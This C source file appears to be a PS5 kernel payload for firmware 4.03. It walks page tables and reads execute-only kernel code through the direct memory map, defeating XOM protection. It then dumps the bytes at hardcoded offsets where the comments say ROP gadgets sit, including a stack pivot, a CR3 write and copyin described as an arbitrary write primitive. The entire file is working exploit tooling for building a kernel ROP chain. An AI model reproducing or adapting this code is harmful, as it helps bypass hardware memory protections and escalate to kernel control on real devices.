#include <stdint.h>

/*
 * PS5 Gadget Reader v2 (kstuff payload)
 *
 * Reads raw bytes from known ktext locations via DMAP to bypass XOM.
 * ktext is execute-only (NPT enforced) - direct reads cause #NPF panic.
 * Instead we: VA -> page table walk -> physical addr -> DMAP read.
 *
 * Runs in kernel context via kldload -> kproc_create.
 * Results written to kthread_args buffer for readback.
 */

/* ── FW 4.03 offsets (relative to kdata_base, negative = ktext) ── */
#define OFF_CPU_SWITCH       (-0x9d6f80)
#define OFF_WRMSR_RET        (-0x9d20cc)
#define OFF_DORETI_IRET      (-0x9cf84c)
#define OFF_REP_MOVSB_POP    (-0x99002a)
#define OFF_MOV_CR3_RAX      (-0x396f9e)
#define OFF_RDMSR_START      (-0x9d0cfa)
#define OFF_POP_ALL_IRET     (-0x9cf8ab)
#define OFF_COPYIN           (-0x9908e0)

/* kernel_pmap_store is at kdata_base + this offset */
#define OFF_KERNEL_PMAP_STORE  0x3257a78

/* Number of bytes to dump per region */
#define REGION_SIZE 256

/* Max number of scan regions */
#define MAX_REGIONS 8

/* Result magic */
#define MAGIC_GADGET 0x47414447  /* "GADG" */

typedef struct {
    uint64_t kdata_base;
    uint32_t fw_ver;
} kproc_args;

/*
 * Output layout (extended with DMAP info):
 *   [0x000] uint32_t magic = "GADG"
 *   [0x004] uint32_t num_regions
 *   [0x008] uint64_t kdata_base
 *   [0x010] uint64_t ktext_base
 *   [0x018] uint64_t dmap_base   (added for debugging)
 *   [0x020] uint64_t cr3_val     (added for debugging)
 *
 *   Per region (starts at 0x028, each region = 8 + 8 + REGION_SIZE):
 *     uint64_t addr       - kernel VA of region start
 *     uint64_t offset     - offset from kdata_base (signed)
 *     uint8_t  bytes[REGION_SIZE]
 *
 * Total per region: 16 + 256 = 272 bytes
 * Header: 40 bytes
 * Max payload: 40 + 8 * 272 = 2216 bytes (fits in 4KB kthread_args)
 */

typedef struct __attribute__((packed)) {
    uint64_t addr;
    int64_t  offset;
    uint8_t  bytes[REGION_SIZE];
} region_t;

typedef struct __attribute__((packed)) {
    uint32_t magic;
    uint32_t num_regions;
    uint64_t kdata_base;
    uint64_t ktext_base;
    uint64_t dmap_base;
    uint64_t cr3_val;
    region_t regions[MAX_REGIONS];
} gadget_result_t;

static inline uint64_t rdmsr(uint32_t msr)
{
    uint32_t lo, hi;
    __asm__ volatile("rdmsr" : "=a"(lo), "=d"(hi) : "c"(msr));
    return ((uint64_t)hi << 32) | lo;
}

static inline uint64_t read_cr3(void)
{
    uint64_t val;
    __asm__ volatile("mov %%cr3, %0" : "=r"(val));
    return val;
}

/*
 * Compute DMAP base address.
 *
 * kernel_pmap_store contains pm_pml4 (virtual address of PML4).
 * CR3 contains the physical address of PML4.
 * DMAP_base = pm_pml4 - CR3_physical
 *
 * This works because DMAP linearly maps physical memory:
 *   virtual = DMAP_base + physical
 */
static uint64_t find_dmap_base(uint64_t kdata_base)
{
    /* kernel_pmap_store is a struct; first field is pm_pml4 (pointer) */
    uint64_t kernel_pmap_addr = kdata_base + OFF_KERNEL_PMAP_STORE;
    uint64_t pm_pml4 = *(volatile uint64_t*)kernel_pmap_addr;

    uint64_t cr3 = read_cr3();
    uint64_t cr3_phys = cr3 & 0x000FFFFFFFFFF000ULL; /* mask flags */

    return pm_pml4 - cr3_phys;
}

/*
 * Translate a kernel virtual address to physical address via page table walk.
 * Returns physical address, or 0 on failure.
 */
static uint64_t va_to_pa(uint64_t va, uint64_t dmap_base)
{
    uint64_t cr3 = read_cr3();
    uint64_t pml4_phys = cr3 & 0x000FFFFFFFFFF000ULL;

    /* PML4 index: bits 47:39 */
    uint64_t pml4_idx = (va >> 39) & 0x1FF;
    uint64_t pml4e = *(volatile uint64_t*)(dmap_base + pml4_phys + pml4_idx * 8);
    if (!(pml4e & 1)) return 0; /* not present */

    /* PML3 (PDPT) index: bits 38:30 */
    uint64_t pml3_phys = pml4e & 0x000FFFFFFFFFF000ULL;
    uint64_t pml3_idx = (va >> 30) & 0x1FF;
    uint64_t pml3e = *(volatile uint64_t*)(dmap_base + pml3_phys + pml3_idx * 8);
    if (!(pml3e & 1)) return 0;
    if (pml3e & 0x80) /* 1GB page */
        return (pml3e & 0x000FFFFFC0000000ULL) | (va & 0x3FFFFFFF);

    /* PML2 (PD) index: bits 29:21 */
    uint64_t pml2_phys = pml3e & 0x000FFFFFFFFFF000ULL;
    uint64_t pml2_idx = (va >> 21) & 0x1FF;
    uint64_t pml2e = *(volatile uint64_t*)(dmap_base + pml2_phys + pml2_idx * 8);
    if (!(pml2e & 1)) return 0;
    if (pml2e & 0x80) /* 2MB page */
        return (pml2e & 0x000FFFFFFFE00000ULL) | (va & 0x1FFFFF);

    /* PML1 (PT) index: bits 20:12 */
    uint64_t pml1_phys = pml2e & 0x000FFFFFFFFFF000ULL;
    uint64_t pml1_idx = (va >> 12) & 0x1FF;
    uint64_t pml1e = *(volatile uint64_t*)(dmap_base + pml1_phys + pml1_idx * 8);
    if (!(pml1e & 1)) return 0;

    return (pml1e & 0x000FFFFFFFFFF000ULL) | (va & 0xFFF);
}

/*
 * Read bytes from a kernel VA via DMAP (bypasses XOM).
 * Handles page boundary crossings.
 */
static void dmap_read(uint8_t* dst, uint64_t va, int len, uint64_t dmap_base)
{
    while (len > 0) {
        uint64_t pa = va_to_pa(va, dmap_base);
        if (pa == 0) {
            /* Translation failed - fill with 0xCC (int3 pattern) */
            int chunk = 0x1000 - (va & 0xFFF);
            if (chunk > len) chunk = len;
            for (int i = 0; i < chunk; i++)
                dst[i] = 0xCC;
            dst += chunk;
            va += chunk;
            len -= chunk;
            continue;
        }

        /* Read up to page boundary */
        int page_remain = 0x1000 - (va & 0xFFF);
        int chunk = (len < page_remain) ? len : page_remain;

        volatile uint8_t* src = (volatile uint8_t*)(dmap_base + pa);
        for (int i = 0; i < chunk; i++)
            dst[i] = src[i];

        dst += chunk;
        va += chunk;
        len -= chunk;
    }
}

static void read_region(region_t* r, uint64_t addr, int64_t offset, uint64_t dmap_base)
{
    r->addr = addr;
    r->offset = offset;
    dmap_read(r->bytes, addr, REGION_SIZE, dmap_base);
}

int module_start(kproc_args* args)
{
    uint64_t kdata_base = args->kdata_base;

    /* Estimate ktext_base from LSTAR */
    uint64_t lstar = rdmsr(0xC0000082);
    uint64_t ktext_base = lstar - 0x294218;

    /* Find DMAP base for bypassing XOM reads */
    uint64_t dmap_base = find_dmap_base(kdata_base);

    gadget_result_t* out = (gadget_result_t*)args;
    out->magic = MAGIC_GADGET;
    out->kdata_base = kdata_base;
    out->ktext_base = ktext_base;
    out->dmap_base = dmap_base;
    out->cr3_val = read_cr3();

    int n = 0;

    /*
     * Region 0: cpu_switch (256 bytes)
     * Context switch function - likely contains stack pivot gadgets.
     */
    read_region(&out->regions[n++], kdata_base + OFF_CPU_SWITCH, OFF_CPU_SWITCH, dmap_base);

    /*
     * Region 1: wrmsr_ret + surrounding context (256 bytes)
     * Contains: wrmsr; ret; nop (our nop_ret gadget)
     */
    read_region(&out->regions[n++], kdata_base + OFF_WRMSR_RET - 16, OFF_WRMSR_RET - 16, dmap_base);

    /*
     * Region 2: doreti_iret region (256 bytes)
     * Contains: swapgs; add rsp,N; iretq
     */
    read_region(&out->regions[n++], kdata_base + OFF_DORETI_IRET - 32, OFF_DORETI_IRET - 32, dmap_base);

    /*
     * Region 3: rep movsb; pop rbp; ret (256 bytes)
     * memcpy gadget for arbitrary memory writes in ROP.
     */
    read_region(&out->regions[n++], kdata_base + OFF_REP_MOVSB_POP - 16, OFF_REP_MOVSB_POP - 16, dmap_base);

    /*
     * Region 4: mov cr3, rax region (256 bytes)
     * CR3 manipulation for page table switching.
     */
    read_region(&out->regions[n++], kdata_base + OFF_MOV_CR3_RAX - 16, OFF_MOV_CR3_RAX - 16, dmap_base);

    /*
     * Region 5: rdmsr region (256 bytes)
     * MSR read gadget.
     */
    read_region(&out->regions[n++], kdata_base + OFF_RDMSR_START, OFF_RDMSR_START, dmap_base);

    /*
     * Region 6: justreturn / pop_all_iret (256 bytes)
     * Return path gadgets for ending the ROP chain.
     */
    read_region(&out->regions[n++], kdata_base + OFF_POP_ALL_IRET - 16, OFF_POP_ALL_IRET - 16, dmap_base);

    /*
     * Region 7: copyin (256 bytes)
     * Kernel copyin function - useful as arbitrary write primitive.
     */
    read_region(&out->regions[n++], kdata_base + OFF_COPYIN, OFF_COPYIN, dmap_base);

    out->num_regions = n;

    return 0;
}
